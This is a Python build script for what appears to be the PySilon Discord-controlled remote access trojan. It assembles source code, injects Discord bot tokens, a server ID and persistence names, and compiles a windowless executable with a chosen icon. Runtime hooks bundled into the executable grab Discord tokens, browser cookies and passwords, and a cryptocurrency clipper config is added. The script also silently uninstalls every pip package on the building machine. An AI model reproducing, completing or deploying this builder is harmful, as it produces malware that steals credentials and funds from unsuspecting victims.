import configparser
import hashlib
import sys
import os

def get_file_hash(path):
    with open(path,"rb") as f, hashlib.sha256() as sha256_hash:
        for byte_block in iter(lambda: f.read(16777216),b""):
            sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()

def compile(debug_mode):
    if not os.path.exists('configuration.ini'): 
        input('Configuration file not found! Press ENTER to terminate...')
        sys.exit(0)
    
    config = configparser.ConfigParser()
    config.read('configuration.ini')

    if len(config['SETTINGS']) != 12 or len(config['FUNCTIONALITY']) != 18:
        return 'Config corrupted'
    
    runtime_hooks = [
        'resources/misc.py',
        'resources/protections.py' if debug_mode else None,
        'resources/discord_token_grabber.py',
        'resources/get_cookies.py',
        'resources/passwords_grabber.py'
    ]

    commands = [
        'title Reorganising packages...',
        'pip freeze > to_uninstall.txt',
        'pip uninstall -y -r to_uninstall.txt > nul',
        'del to_uninstall.txt > nul',
        'pip install pillow > nul',
        'pip install pyinstaller > nul',
        'pip install -r custom_imports.txt > nul',
        'title Compiling source code...',
        'pyinstaller -F --noconsole --add-data "resources/libopus-0.x64.dll;." ' + ' '.join(f'--runtime-hook={rh}' for rh in runtime_hooks if rh) + ' --add-data="crypto_clipper.json;." --icon "' + config['SETTINGS']['icon_path'] + '" "source_prepared.py" > nul',
        'echo -',
        'echo Done',
        'echo -',
        'start dist',
        'del source_prepared.spec > nul',
        'rmdir build /S /Q',
        'pause',
        'exit'
    ]
    
    compiling_command = 'start cmd /k "' + ' & '.join(commands) + '"'
    
    with open('PySilon.key', 'wb') as f:
        f.write(os.urandom(1024*1024))


    with open('source_assembled.py', 'r', encoding='utf-8') as f:
        source_code = f.readlines()

    bot_tokens = [config['SETTINGS'][f'bot_token_{i+1}'] for i in range(3) if config['SETTINGS'][f'bot_token_{i+1}']]

    replacements = {
        'bot_tokens': ', '.join(f"'{token}'" for token in bot_tokens),
        'software_registry_name': config['SETTINGS']['registry_name'],
        'software_directory_name': config['SETTINGS']['directory_name'],
        'software_executable_name': config['SETTINGS']['executable_name'] + ('' if config['SETTINGS']['executable_name'].endswith('.exe') else '.exe'),
        'secret_key': get_file_hash('PySilon.key'),
        'guild_id': config['SETTINGS']['server_id']
    }
    
    with open('source_prepared.py', 'w', encoding='utf-8') as f:
        for line_number, line in enumerate(source_code):
            for key, value in replacements.items():
                if line.startswith(key):
                    f.write(f"{key} = '{value}'\n")
                    break
            else:
                if line.startswith('    \'info\''): f.write('    \'info\': True,\n')
                if line.startswith('    \'main\''): f.write('    \'main\': True,\n')

                if line.lstrip().startswith('#.log ') and debug_mode:
                    f.write(' '*(len(line)-len(line.lstrip())) + 'log(\'' + f'{line.lstrip()[:(-1 if line[-2]!="*" else -3)].replace("#.log ", "")}' + (' (' if line[-2]!='*' else '->') + f'source_assembled.py:{line_number})' + '\')\n')
                elif not line.startswith('#') and line.replace(' ', '') != '\n' and not line.lstrip().startswith('#.log '): 
                    f.write(line)
    
    os.system(compiling_command)
